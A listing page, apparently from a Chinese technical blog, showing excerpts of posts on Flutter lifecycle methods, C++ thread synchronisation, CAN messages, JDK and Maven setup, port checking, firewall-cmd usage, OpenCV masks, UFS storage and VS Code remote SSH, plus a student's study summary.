	<div class="content list__excerpt post__content clearfix">
		 initState()函数是在组件渲染之前执行的。在Flutter中，initState()是StatefulWidget的生命周期方法之一，在调用build()方法之前被调用。当创建一个StatefulWidget并将其添加到组件树中时，Flutter会实例化该组件的状态对象，并在调用initState()方法后再调用build()方法来构建UI。initState()通常用于执行一些初始化操作，比如数据获取、订阅事件、启动定时器等。它只会被调用一次，在组件的整个生命周期中只执行一次。一旦initState()被调用并完成后，就会立即调用build()方法来构建UI。所以，如果你希望在UI构建之前执行某些操作，可以放在initState()中。值得注意的是，在initState()中不要执行耗时的操作或阻塞UI线程的操作，因为这可能导致应用程序卡顿。如果需要进行异步操作，可以使用Future、async/await等方式来处理。setState()方法不会触发initState()的重新执行。当调用setState()时，它会通知Flutter框架重新构建相关的组件树，并调用build()方法来更新UI。initState()方法只在初始化组件时调用一次，在组件的整个生命周期中不会再次执行。它主要用于执行一些初始化操作，比如数据获取、订阅事件、启动定时器等。当你调用setState()方法后，Flutter会检测到状态发生了变化，并执行与该组件相关的build()方法来生成新的UI。在build()方法中，你可以使用新的状态值进行UI渲染。所以，当你在setState()中更新了状态数据后，Flutter将会重新构建相关的组件，但不会重新执行initState()方法。initState()只会在组件初始创建时被调用一次。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5393b3750d6c3c91317c72684b3f147/" rel="bookmark">
			大二总结，记录下自己的收获。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一：从大一到大二结束每个学期的学习时间
二：成长历程
三：学习知识
3.1：大一学习知识
3.1：大二学习知识
四：接下来的路
学习时间 大一上(每天学习5小时)：7点起床，学习时间：早上9点到11点，下午2点到5点晚上打游戏，放松。睡觉时间不固定，经常熬夜。 大一下(每天学习8小时)：7点起床，学习时间：早上8点到12点，下午2点到6点，晚上打游戏，12点睡觉 大二上(每天学习10小时)：7点起床，学习时间：早上8点到12点，下午2点到6点，晚上8点到10点，礼拜五到礼拜天晚上休息放松，12点睡觉 大二下(每天学习11小时)：7点起床，学习时间：早上8点到12点，下午2点到6点，晚上8点到12点，晚上8点到11点, 12点睡觉 大二下暑假（已经慢慢达到12小时）6点起床，学习时间：早上7点到12点，下午2点到6点，晚上7点到10点, 晚上11点睡觉。 成长历程 大二马上结束了，感叹时间过的真快啊， 记得刚上大学时心里特别躁动，总是很难静下心来学习，每天最多学习5小时就不行了，思想总是出差，学习效率低下，经常性熬夜，游戏，电影，动漫，还有欲望等等任何一个诱惑都会对我产生影响，让我坐立难安，可以说大一上是我学习最困难的时候，脑子里都是一些不干净的东西，而且那时候我还对学习保持着高中的态度，特别讨厌学习，能坚持下来完全是凭借强大的意志力。 虽然大一的时候不喜欢学习，但是最后我还是保持了每天坚持，没有缺少一天。好在我没有放弃，成功的坚持了下来，这在后来形成了一个强大的意志力。大一下学期接触了算法，这个是一个转折点，正是因为算法，才让我慢慢的对学习产生了兴趣，那时候一整个寒假都在家学算法，一个月学完了Awing了算法基础课（12天），以及蓝桥杯辅导课（18天）（每天学6，7小时，晚上打游戏)然后在整个大一下我除了算法其他什么都没学。大二上又接触了开发，自此之后特地对计算机产生了浓厚的兴趣，后面基本就是随随便便学10个小时以上，靠的不在是意志力，而是兴趣和习惯。从大一到现在除了过春节去亲戚家做客，我没有中断过一天的学习，每天都是固定时间起床，学习，吃饭，睡觉，过着在外人看来无聊，在我自己看来学习所给我带来的类似成就感的快乐以及远超游戏以及其他诱惑给我带来的快乐，自此无论任何诱惑对于我的心境都没产生任何影响。 学习知识 首先说明这里只详细说明我课外学习到的知识，像一些高数，现代，离散，概率论之类的直接一笔概括了。 其次说明在这里我为什么要将大一大二分开来说。 因为大一大二学习到的东西差距太大了，大二学到的知识是大一的数倍，最主要是产生了兴趣，而且大一的坚持为大二打下了良好的习惯，学习效率也越来越高，所以大一学到的知识与大二相比较完全不值一提。 大一学到的知识 1：C语言Mooc慕课视频看了三遍, 总共在MOOC看了153小时视频 2：自学完数据结构（学了一个星期把整本书过了一遍） 3: 英语四级单词背完，我记得背了不下三遍，背了又忘，忘了又背，感觉现在忘的差不多了)以及老师上课发的两本英语书（好像一共5个单元，每个单元有4页单词） 4：C语言网刷了102道语法题, Acwing的算法基础课，算法提高课，蓝桥杯辅导课全部二刷完成。 5：高数，现代，离散等学校课程 首先说一下我为什么要背英语单词，因为我从小英语就很非常的不行，初中英语30分，高中60分，高中后面还好，至少高考及格了。但语感还是不行，所以我不希望在未来因为英语不行而拖累我整个进程，所以每天坚持背单词。 其次大学刚开始学编程天天啃书，开学一个月，我连个scanf, printf都分不明白，没掌握方法 学习部分记录如下
大二学习到的知识 1：开发看了1076小时的视频, 从大二上0基础开始，后端到前端再到运维 2：开发了3个项目（不包括B战项目） 3：算法刷了1055题 4：王道408一刷 5：英语背了10890分钟单词（英语六级） 6：学校课程比如概率论 7：代码量至少能到10W行，光我的微服务个人博客就3W行（未开发完），还有1055道算法题，以及其他两个项目和在B站学习敲的代码。 第一点：肯定不是很准确，这是我把每个视频看的大概时间计算机出来的，因为有的视频看了部分，所以估算可能有误差，但不会差很大。
第二点：：一个前后端分离，两个微服务。其中的前后端分离（三项安全管理项目）和一个微服务个人博客是我自己开发的为开发完，现在写了3W行代码，连前台管理系统的一半都没写完, 而且还要写后台管理系统，另一个微服务是和别人合作开发的，是个大项目包括（手机端，小程序端，PC端），现在光数据库就建立了87个
第三点：算法很可惜，走了一年半的弯路，整个大二虽然刷了1055题，但是这一年的提升还不如这个暑假的提升大。
学习截图：
这是看过的视频
还有各个网站的比赛，英语是大二下一个学期背的，大二上用单词书背的不好统计，所以直接用大二下学期时间 * 2
接下来的路 现在已经确定准备考研了，所以接下来就是学开发，搞算法，二刷408， 每天坚持背单词， 开发：尽快完成微服务个人博客，学完设计模式，JUC并发编程，JVM虚拟机。 算法：每天坚持算法题，开始打各个网站的比赛 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0764a235ed5fdf67c34c2b95b01e023a/" rel="bookmark">
			KASLR 内核随机地址配置开启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CONFIG_RANDOMIZE_BASE
kernel features
---&gt; Randomize of module region independently from the core kernel
参考链接：KASLR 内核动态地址 - kk Blog —— 通用基础 (abcdxyzk.github.io)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/174ff1adba4a7e63520bfd332ec2ef4a/" rel="bookmark">
			C&#43;&#43;多线程编程——线程同步（保姆级-1.4W字）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
C++线程同步
引入
互斥锁
std::mutex
std::lock_guard类模板 unique_lock
成员方法
应用举例
std::lock()函数模板
std::call_once(flag、function)
懒汉式单例模式实例
unique_lock互斥锁方式
​编辑 call_once方式
条件变量
std::condition
条件变量使用实例
原子操作
读写atomic对象的值
原子操作使用实例
内存模型：强顺序与弱顺序
C++线程同步 引入 线程同步是一种编程技术，它用于在多线程环境中确保多个线程能够正确、安全地共享和访问共享资源。线程同步的主要目的是防止数据竞争和不一致性，以及避免多个线程同时对同一数据进行修改或访问导致的问题。
以下是一些需要实现线程同步的情况：
数据竞争：当多个线程同时访问和修改共享资源时，可能导致数据不一致或不可预测的结果。例如，如果两个线程都尝试修改同一个变量的值，其中一个线程的修改可能会被另一个线程覆盖，导致数据错误。死锁：当多个线程相互等待对方释放资源时，会导致程序陷入死锁状态，无法继续执行。例如，线程A等待线程B释放资源，而线程B正在等待线程A释放资源，导致两个线程都无法继续执行。资源竞争：当多个线程同时访问共享资源时，可能会导致资源争用，影响程序的性能和响应时间。例如，多个线程同时访问同一个文件或数据库连接，可能会导致读写冲突和性能下降。 因此，实现线程同步的目的是确保多个线程能够正确地访问和修改共享资源，避免数据竞争、死锁和资源竞争等问题。常用的线程同步技术包括互斥锁、信号量、条件变量、读写锁等。
C++11对于线程同步提供了四种机制，分别是
互斥锁std::call_once(flag、function)条件变量原子操作 以两个线程对文件进行写入操作为例，如果不加以同步操作，由于线程时间片调度机制，会产生线程竞态，从而会导致写入的数据顺序发生混乱
#include &lt;iostream&gt; #include &lt;thread&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; using namespace std; class FileWriter { public: void myWriter1(int fd) { int num=50; while(num--) { write(fd,"hello",5); write(fd,"world",5); write(fd,"\n",1); } } void myWriter2(int fd) { int num=50; while(num--) { write(fd,"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/174ff1adba4a7e63520bfd332ec2ef4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/476047e68a7d7979ece4d35eb52b7557/" rel="bookmark">
			CAN报文发送类型和信号发送类型、恢复默认值方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CAN报文发送类型 报文发送类型有周期型Cycle、事件型Event、周期事件型CycleEvent（简称CE）、激活型IfActive
周期型Cycle最简单，就是按照固定周期循环发送的报文。
事件型Event平时不发送，当事件发生的时候才发送一段时间后停发。
周期事件型CE就有点复杂了，他有两个周期，快发周期和慢发周期，平时按照慢发周期（譬如100ms），事件发生的时候按照快发周期（譬如20ms）发一段时间后切换回慢发周期。
激活型IfActive平时不发送，状态激活的时候才发送。
CAN信号发送类型 信号发送类型有周期型Cycle、变化重复发送型OnChangeWithRepetition、变化不重复发送型OnChangeWithoutRepetition、写入重复发送型OnWriteWithRepetition、写入不重复发送型OnWriteWithoutRepetition、激活重复发送型IfActiveWithRepetition、激活不重复发送型IfActive
周期型Cycle也称Pending，就是按照固定周期循环发送的信号，一般在周期型发送的报文里面。
变化重复发送型OnChangeWithRepetition也称OnChange，数据有变化的时候才发送，会按照指定周期重复发送一段时间后停发。
变化不重复发送型OnChangeWithoutRepetition数据有变化的时候发送，但不会重复发送。
写入重复发送型OnWriteWithRepetition也称OnWrite或者Triggered，写入（一般就是发生事件）就会发送，会按照指定周期重复发送一段时间后停发。
写入不重复发送型OnWriteWithoutRepetition也称TriggeredWithoutRepetition写入（一般就是发生事件）就会发送，但不会重复发送。
激活不重复发送型IfActiveWithoutRepetition也称IfActive，激活状态下才会发送，会按照指定周期重复发送一段时间后停发。
激活重复发送型IfActiveWithRepetition激活状态下才会发送，但不会重复发送。
CAN信号恢复默认值方式 信号恢复默认值在不同的报文里面有不同的方式
周期型报文Cycle不涉及这个
事件型报文Event里面的信号每次停发之后都会变成默认值
激活型报文IfActive和周期事件型报文CycleEvent里面的信号按照恢复默认值方式分为保持型和非保持型。拿周期事件型报文来举例，如果里面的信号是保持型，事件发生时信号值会变成一个非默认值，事件结束后信号数值依然会保持为这个非默认值。如果里面的信号是非保持型，事件发生时信号值会变成一个非默认值，事件结束后信号数值就会恢复默认值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c67624f91ee13b4b7792e929bb8bf750/" rel="bookmark">
			Mac 环境配置jdk、Maven
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mac 环境配置jdk、Maven 一、安装Java jdk二、Maven 安装与环境配置三、Maven 配置 一、安装Java jdk 1、查看自己的mac是macOS x64还是macOS ARM64
打开终端输入：
uname -a
2、去Oracle官网下载jdk（我下的1.8版本的，项目需求）
有个锁是因为需要同意协议并登录Oracle账号，没有的话注册下也很快，登陆后立马就开始下载了
下载后直接安装即可，很快，点几下就OK了
3、查看jdk安装路径：
1）下载安装jdk后，终端命令行下java -version 已经能查看到java版本，但是并不会自动设置JAVA_HOME的环境变量
2）终端输入：/usr/libexec/java_home -V
/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home 即为jdk的安装路径
4、配置JDK环境变量
输入下方命令新建脚本文件：touch .bash_profile
打开上述文件 open -e .bash_profile
输入⬇️并保存： 其中第一行JAVA_HOME替换为自己下的jdk路径
JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home PATH=$JAVA_HOME/bin:$PATH:. CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar:. export JAVA_HOME export PATH export CLASSPATH 输入⬇️ 使得刚才写好的配置生效
source .bash_profile 5、查看jdk是否安装成功和系统能不能识别java命令：⬇️
IDEA 添加jdk路径，找了半天找不到IDEA上面的 file那一排，原来是Mac的都在窗口最上角。。。Mac小白吐血。。。
OK！
二、Maven 安装与环境配置 1、去Maven官网下载，选择对应上面刚下载好的jdk版本的Maven版本，安装编译好的二进制版本，具体安装zip还是tar.gz我看的菜鸟教程，说是Mac安装tar.gz
2、把安装好的Maven文件解压后拷贝到：
/usr/local/apache-maven-3.9.4 3、终端打开配置jdk时候建好的脚本文件： open -e .bash_profile
输入：⬇️
MAVEN_HOME=/usr/local/apache-maven-3.9.4 PATH=${PATH}:${MAVEN_HOME}/bin:${JAVA_HOME}/bin 输入⬇️ 使得刚才写好的配置生效
source .bash_profile 4、查看maven是否安装成功和系统能不能识别maven/mvn命令：⬇️
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c67624f91ee13b4b7792e929bb8bf750/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3760c7c76fa4606e8306d14808f501d7/" rel="bookmark">
			怎么查看Linux服务器与Windows服务器的端口是否开放？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在服务器管理过程中，了解服务器的端口是否开放是确保网络安全和应用程序正常运行的重要一步。本文将为您介绍如何查看Linux服务器和Windows服务器上的端口是否开放，以帮助您有效地监控和确保服务器的运行状态。
一、Linux服务器端口状态检查：
要查看Linux服务器上的端口是否开放，可以使用以下命令和工具：
1. netstat命令：在Linux服务器上打开终端，输入"netstat -tuln"命令。该命令将列出所有当前正在监听的端口，并显示其状态(开放或关闭)。
2. nmap工具：nmap是一款功能强大的端口扫描工具，可以用来检查远程服务器上的端口状态。在Linux服务器上输入"sudo nmap -p 端口号 IP地址"命令，将显示指定端口在目标服务器上的状态。
3. telnet命令：在Linux服务器上，可以使用"telnet IP地址 端口号"命令来尝试建立与指定端口的连接。如果连接成功，则表示该端口开放。
二、Windows服务器端口状态检查：
要查看Windows服务器上的端口是否开放，可以使用以下方法：
1. 使用telnet命令：在Windows服务器上，打开命令提示符(CMD)窗口，输入"telnet IP地址 端口号"命令来尝试建立与指定端口的连接。如果连接成功，则表示该端口开放。
2. 使用PowerShell命令：在Windows服务器上打开PowerShell窗口，输入"Test-NetConnection -ComputerName IP地址 -Port 端口号"命令。这将检查指定端口在目标服务器上的状态，并显示结果。
3. 使用第三方工具：还可以使用一些第三方端口扫描工具，如Nmap、PortQry等，来检查Windows服务器上的端口状态。这些工具提供更多高级功能和扫描选项。
三、使用防火墙管理工具：
Linux和Windows服务器都有防火墙功能，它可以用来控制端口的开放状态。通过防火墙管理工具，可以查看和配置特定端口是否允许进出。在Linux服务器上，常用的防火墙工具是iptables和ufw;而Windows服务器上的防火墙管理工具是Windows防火墙。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f8240c970ae7869802965c9b98e435c/" rel="bookmark">
			如何将基于 iObjects Java 组件开发的程序打包生成 RPM 和 DEB 安装包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 背景2. 依赖环境3. fpm 安装与环境准备4. fpm 打包4.1. fpm 生成 RPM 安装包4.2. fpm 生成 deb 安装包 5. 安装测试 fpm 生成的安装包5.1. 在 CentOS 操作系统测试 fpm 生成的 rpm 安装包5.2. 在 Ubuntu 操作系统测试 fpm 生成的 deb 安装包 1. 背景 SuperMap iObjects Java 是 SuperMap Objects 家族中的一员，是基于超图共相式 GIS 内核进行开发的，采用 Java 技术的组件式 GIS 开发平台。
SuperMap iObjects Java 具有跨平台能力，支持多种 CPU 架构，包括：x86、ARM、MIPS、飞腾、龙芯等；支持多种操作系统，包括：Linux、Windows、中标麒麟、银河麒麟、深度等。
某些基于 SuperMap iObjects Java 组件开发的程序，需要在 Linux 操作系统中运行，由于某些原因，部分 Linux 操作系统不支持 iObjects Java 组件解压使用，只能通过安装包安装使用，本篇主要讲述如何将基于 iObjects Java 组件开发的程序打包生成 RPM 和 DEB 安装包。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f8240c970ae7869802965c9b98e435c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10c0380446de53af3c89fb5c3155693e/" rel="bookmark">
			MMSegmentation 模型训练结果批量推理及结果保存脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import os import torch import cv2 import argparse import numpy as np from pprint import pprint from tqdm import tqdm from mmseg.apis import init_model, inference_model DEVICE = torch.device('cuda:0') if torch.cuda.is_available() else torch.device('cpu') # 测试图像所在文件夹 IMAGE_FILE_PATH = r"dataset\test\images" # 模型训练结果的config配置文件路径 CONFIG = r'work_dir\dmnet_r50\dmnet_r50-d8_4xb4-160k_ade20k-512x512.py' # 模型训练结果的权重文件路径 CHECKPOINT = r'work_dir\dmnet_r50\best_mIoU_iter_25600.pth' # 模型推理测试结果的保存路径，每个模型的推理结果都保存在`{save_dir}/{模型config同名文件夹}`下，如文末图片所示。 SAVE_DIR = r"work_dir\infer_results" def parse_args(): parser = argparse.ArgumentParser(description='Visualize CAM') parser.add_argument('--img', default=IMAGE_FILE_PATH, help='Image file') parser.add_argument('--config', default=CONFIG ,help='Config file') parser.add_argument('--checkpoint', default=CHECKPOINT, help='Checkpoint file') parser.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10c0380446de53af3c89fb5c3155693e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67e685ef09194f0921df8e7c726d5276/" rel="bookmark">
			小程序设置底部安全距离
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		constant(safe-area-inset-bottom)和env(safe-area-inset-bottom)都是CSS中的属性值，用于在小程序中设置底部安全距离。它们的作用和用法略有不同。
constant(safe-area-inset-bottom)是CSS的一个属性值，用于设置底部安全距离。它表示一个固定的值，可以直接使用具体的像素值来设置。例如：
css复制代码
.model { padding-bottom: constant(safe-area-inset-bottom); } 这将把.model元素的底部padding设置为底部安全距离的值。
另一方面，env(safe-area-inset-bottom)也是一个CSS属性值，用于设置底部安全距离。它表示使用环境变量来获取底部安全距离的值。当使用环境变量时，需要使用env()函数来引用具体的环境变量。例如：
css复制代码
.model { padding-bottom: env(safe-area-inset-bottom); } 这将把.model元素的底部padding设置为环境变量safe-area-inset-bottom的值。
需要注意的是，constant()和env()函数在CSS中的使用方法略有不同。constant()函数是WebKit的CSS函数，用于在小程序中设置底部安全距离。而env()函数是CSS的通用函数，可以在任何支持的环境中使用。因此，在不同的环境或框架中，这两个函数的使用方式可能会有所不同。
总的来说，constant(safe-area-inset-bottom)和env(safe-area-inset-bottom)都是用于设置底部安全距离的CSS属性值，但它们的使用方式和适用环境略有不同。具体使用哪个取决于您所使用的环境或框架的要求。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0141ee098455832e6a61e15ba8befd6d/" rel="bookmark">
			UFS从入门到精通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UFS详细介绍—终章 UNIVERSAL FLASH STORAGE (UFS)，通用闪存存储器。目前最新的标准是UFS4.0；UFS的出现是因为替代eMMC产品的，但是因为价格等，目前没办法做到完全替代。
2020年，JEDEC发布了UFS3.1；2022年，JEDEC发布了UFS4.0，4.0版本主要提升也就是之前提到的，高性能、低功耗、主要面对的也是手机等这一类终端。
UFS传输 其实可以看到，任何存储设备的结构都是和计算机网络的基础结构一样，包含了物理层、数据链路层、应用层等。对应的UFS物理层就是MIPI M-PHY、数据链路层MIPI unipro以及其他层。
在这里插一句，UFS4.0标准，需要高性能、低功耗，不仅仅是应用层的提升，更重要的是下面两层偏向于物理层的提升。这个需要UFS厂商能够做到新的工艺，满足设备实际速率的提升。
为了实现最高性能和最节能的数据传输，JEDEC UFS利用MIPI®联盟的行业领先规范来形成其互连层。UFS 4.0版继续了这一合作，该版本引用了MIPI M-PHY®v5.0物理层规范和MIPI UniPro®v2.0传输层规范。
SCSI driver SCSI就是指Small Computer System Interface(小型计算机系统接口)，它最早研制于1979年，原是为小型机的研制出的一种接口术，但随着电脑技术的发展，现在它被完全移植到了普通微机上。SCSI广泛应用于如：硬盘、光驱、ZIP、MO、扫描仪、磁带机、JAZ、打印机、光盘刻录机等设备上，由于较其他标准接口的传输速率来得快，所以在较好的高端电脑、工作站、服务器上常用来作为硬盘及其他储存装置的接口。
而早期的UFS协议，其中就使用了SCSI协议，这种协议就是机械硬盘上差不多的技术。
SCSI 命令，UFS规格书中的描述
但是这种早期的技术，协议实在是有点落后，具体可以看一下网上资源。所以在UFS4.0里面，已经不再使用SCSI协议，而是使用的自己的协议，具体是啥后面再更新吧。
LU 芯片内的LU，英文就是Logic unit，逻辑块、逻辑单元。
其实很容易理解，就好比一个县城，每个LU就是一个小镇，这样做其实就是做一个实际的分区，便于有条理的控制。
对于芯片来讲，内部分区用来存放不同的数据，而已，比如：UFS的存储、BOOT存储、编程区域等。
接口部分 UFS设备和控制器之间，联系其实就是如下信号：
RST_N 复位，就是恢复设备初始上电状态；
时钟：用来做数据传输的参考时钟，目前时钟的速率是一定的，19.2MHz、26MHz、38.4MHz，这个时钟速率就只有这几类，不能变化。
DIN_T\C：就是设备输入数据，就是Host给到UFS的数据，这个是差分线传输，就是需要两根线传输。
DOUT_T\C：就是设备输出数据，也就是UFS给到Host的数据，这个也是差分线传输。
目前来看一般是DIN_T\C 和DOUT_T\C都是各有两组，我们其实可以称之为2lane。
其实这个也是可以控制的，比如说我只用一组，但是实际上我们用UFS就是为了提升速率，所以除非硬件限制，一般都都是用两lane传输。
完整描述如下：
关于速度 其实速率这块，我们说的协议上说的最大速率，其实是发挥出最好性能的效果，在实际传输中，这个速度是一直在变化的。就如下面的速录，是会自己选择的。
高速情况下也会导致器件功耗的加大，因为单位时间IO翻转对应的驱动电流等会一直变化。所以我们说UFS说的低功耗，只是相对而言的。
比如传输相同的数据，emmc需要1分钟，而UFS可能只需要他的一半时间，甚至更小。而这两者乘积相比，UFS更小，所以我们说他低功耗；如果仅仅比较某个单位下的功耗，UFS一定是更大的。
如实际的镁光产品速率：
请大家注意，虽然标注的速率很大，但是对应的控制器可能做限速，这样是达不到最大值，这也就是厂商经常说的满血版，其实也可能不是。
数据传输 micro规格书内的UPIP描述
写的什么垃圾玩意，和生活对线的我，已经静不下心来学习了，只想刷手机。
工作带来的压力是巨大的。
后面很少写了
有朝九晚五的工作联系小弟，大佬们。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e48fef2a10ba093c1fcc187731e095fe/" rel="bookmark">
			如何在OpenCV Python中生成图像遮罩？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们可以通过计算掩模和图像的 cv2.bitwise_and() 来应用掩模到图像上。要跟踪颜色，我们使用 cv2.inRange() 在HSV颜色空间中定义掩模，传递颜色数值的下限和上限。
要跟踪图像的一部分，我们可以使用 np.zeros() 定义一个掩模，并对待检查的输入图像区域为白色（255）的条目进行切片。按照以下给定的步骤生成图像掩模 –
第一步是导入必要的库。所需的Python库是 OpenCV 和 NumPy 。确保您已经安装了它们。 然后使用 cv2.imread() 方法读取输入图像。将图像BGR转换为HSV以跟踪输入图像中的颜色。要跟踪图像的一部分，请保持图像为BGR格式。
使用 cv2.inRange() 定义一个掩模以跟踪图像中的特定颜色。传递颜色在HSV格式中的下限和上限。如果要跟踪输入图像的矩形部分，请使用一个矩形图像（称为 mask ），并使用 cv2.zeros() 填充掩模的条目以跟踪原始图像中的区域。
使用 cv2.bitwise_and() 在 mask 和输入图像之间执行按位与操作。
现在显示掩模和掩膜图像。
我们将使用此图像作为 输入文件 在以下示例中-
示例 在此Python程序中，我们创建一个颜色掩模以跟踪输入图像中的黄色。在此示例中，我们使用HSV颜色空间获取颜色掩模。
# 导入必要的库 import cv2 import numpy as np # 读取输入图像 img = cv2.imread('car.jpg') # 将BGR转换为HSV hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV) # 定义HSV颜色中蓝色的范围 lower_yellow = np.array([15,50,180]) upper_yellow = np.array([40,255,255]) # 创建一个掩模。使用HSV图像阈值获取仅有黄色颜色 mask = cv2.inRange(hsv, lower_yellow, upper_yellow) # 与原始图像掩膜进行按位与操作 result = cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e48fef2a10ba093c1fcc187731e095fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/535bb9d18356c3d884a5e70905f49c75/" rel="bookmark">
			Firewall-cmd防火墙常用操作命令-格式化版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #查看防火墙状态 systemctl status firewalld #启动防火墙 systemctl start firewalld.service #当前机器对源ip开放所有端口（相当于对这个ip开放了白名单） firewall-cmd --zone=public --add-rich-rule 'rule family="ipv4" source address="10.11.12.13" accept' --permanent #删除对所有ip开放的端口 firewall-cmd --zone=public --remove-port=12345/tcp --permanent #增加对所有ip开放的端口 firewall-cmd --permanent --add-port=54321/tcp #对指定ip开放指定端口 firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.11.12.13" port port=12345 protocol=tcp accept' #防火墙重新加载生效 firewall-cmd --reload #查看对所有ip开放的端口 firewall-cmd --list-port #查看对那些ip开放了白名单 firewall-cmd --zone=public --list-rich-rule 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdf047434c51a5ef1da1f6bcf1860b7f/" rel="bookmark">
			endl和“\n“两种换行的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 今天在码蹄集刷一道平衡三进制的题目，题目也很简单，就是把平衡三进制转化为十进制输出，题目写出来后，发现总是超时，然后重新检查改代码，一直都AC不了，后来看了别人的题解才知道是换行的问题。
endl和"\n"虽同为换行，但endl还有清空缓冲区的功能，所以endl速度上可能会比"\n"换行慢上10倍。
所以打比赛时，换行还是尽量用"\n"比较好。
题目原题：码题集OJ-三进制计算机1 (matiji.net)
附上AC代码吧
#include&lt;iostream&gt; using namespace std; #include&lt;vector&gt; #define int long long vector&lt;string&gt;arr; int n; string s; signed main() { ios::sync_with_stdio(false); cin.tie(0); cout.tie(0); cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; s; arr.push_back(s); } for (int i = 0; i &lt; n; i++) { int a = 1, sum = 0; int len = arr[i].length(); for (int j = len-1; j &gt;= 0; j--) { if (arr[i][j] == '1') { sum += a; } else if (arr[i][j] == '-') { sum -= a; } a *= 3; } cout &lt;&lt; sum &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdf047434c51a5ef1da1f6bcf1860b7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3320447a8aa3275d08ac9862e344f51d/" rel="bookmark">
			使用VScode SSH公网远程连接本地服务器开发【无公网IP内网穿透】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言1、安装OpenSSH2、vscode配置ssh3. 局域网测试连接远程服务器4. 公网远程连接4.1 ubuntu安装cpolar内网穿透4.2 创建隧道映射4.3 测试公网远程连接 5. 配置固定TCP端口地址5.1 保留一个固定TCP端口地址5.2 配置固定TCP端口地址5.3 测试固定公网地址远程 前言 远程连接服务器工具有很多，比如XShell、putty等，可以通过ssh来远程连接服务器，但这用于写代码并不方便，可能需要现在本地写好代码后再将源代码传送到服务器运行、服务器上的图片也无法直接查看…
而vscode可以很好的解决这些问题，它的核心组件都运行在远程环境中，本地的开发机器完全不需要拥有远程开发环境的源代码，在vscode上编写代码可以直接同步更新到服务器上，给你带来丝滑般的远程开发体验。
所以这篇文章教程，我们将通过vscode实现远程开发，并做内网穿透实现在公网环境下的远程连接，在外任意地方也可以远程连接服务器进行开发写代码。
1、安装OpenSSH 打开Windows开始页面，直接进行搜索PowerShell，打开第一个Windows PowerShell，点击以管理员身份运行
打开之后，输入以下指令：
Get-WindowsCapability -Online | ? Name -like 'OpenSSH*' 此时出现的结果就是电脑里没有安装OpenSSH的情况：
如果已经安装了OpenSSH那么跳过这一步，没有安装的话则输入以下指令
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 最终结果为如下，则代表着OpenSSH安装成功：
显示OpenSSH安装成功后，在打开本地cmd进入之后输入命令ssh
ssh 如果显示的是这样结果的话，则说明正确：
2、vscode配置ssh 在windows上安装vscode，安装成功后并打开。
点击左侧工具栏中的扩展，搜索“ssh”，选择第一个Remote - SSH进行安装（我已经安装过了，所有此时显示的是禁用状态）
点击左下角的“设置”按钮，紧接着点击“设置”
根据截图的提示，找到Show Login Terminal并勾选该选项
点击左侧工具栏中的远程按钮，可以查看远程连接，点击SSH TARGETS下面显示的服务器旁边的按钮进行连接操作
